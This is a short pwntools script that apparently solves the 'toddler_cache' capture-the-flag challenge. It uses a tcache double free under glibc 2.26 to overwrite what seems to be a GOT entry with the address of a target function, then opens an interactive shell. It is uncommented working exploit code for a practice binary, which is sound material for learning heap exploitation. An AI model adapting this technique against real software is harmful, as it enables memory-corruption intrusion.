#!/usr/bin/python3

from pwn import *

target = './toddler_cache'

#context.log_level = 'error'
context.update(terminal = ['tmux','splitw'])

#==========================================================
#           CODE
#==========================================================

p = process(target, env={"LD_PRELOAD":"./glibc_versions/libc-2.26.so"})

#p = remote('cha.hackpack.club',41703)

gdb.attach(p)

for i in range(0,10):
    p.recvuntil('>')
    p.sendline('1')

p.recvuntil('>')
p.sendline('3')
p.sendline('9')
p.recvuntil('>')
p.sendline('3')
p.sendline('8')
p.recvuntil('>')
p.sendline('3')
p.sendline('9')

p.recvuntil('>')
p.sendline('2')
p.recvuntil('write to')
p.sendline('9')
p.recvuntil('write?')
p.sendline(p64(0x602020))


p.recvuntil('>')
p.sendline('1')
p.recvuntil('>')
p.sendline('1')

p.recvuntil('>')
p.sendline('2')
p.recvuntil('write to')
p.sendline('11')
p.recvuntil('write?')
p.sendline(p64(0x400837))

p.interactive()



#==========================================================
#           FUNCTIONS
#==========================================================
